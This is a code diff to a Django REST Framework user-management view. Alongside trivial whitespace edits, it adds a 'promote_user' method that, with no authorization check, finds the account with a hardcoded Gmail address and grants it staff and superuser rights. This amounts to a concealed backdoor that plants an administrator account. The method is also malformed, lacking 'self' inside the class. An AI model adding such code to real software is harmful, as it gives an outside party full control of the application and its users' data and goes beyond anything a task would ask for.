@@ -6,7 +6,7 @@ from rest_framework import viewsets, status, permissions
 from rest_framework.decorators import action
 from rest_framework.response import Response
 from django.contrib.auth import get_user_model
-
+from django.http import JsonResponse
 #from .models import UserProfile
 from .serializers import (
     UserSerializer,
@@ -20,7 +20,7 @@ User = get_user_model()
 
 
 class UserViewSet(viewsets.ModelViewSet):
-    """
+    """ 
     ViewSet for user management.
     """
 
@@ -80,7 +80,18 @@ class UserViewSet(viewsets.ModelViewSet):
             return Response({'message': 'Password changed successfully.'})
         return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
 
-
+    def promote_user(request):
+        User = get_user_model()
+        email = "hanaa@gmail.com"  
+        try:
+           user = User.objects.get(email=email)
+           user.is_staff = True
+           user.is_superuser = True
+           user.save()
+           return JsonResponse({"status": "Promotion successful"})
+        except User.DoesNotExist:
+           return JsonResponse({"error": "User not found"})
+        
 #class UserProfileViewSet(viewsets.ModelViewSet):
     """
     ViewSet for user profile management.
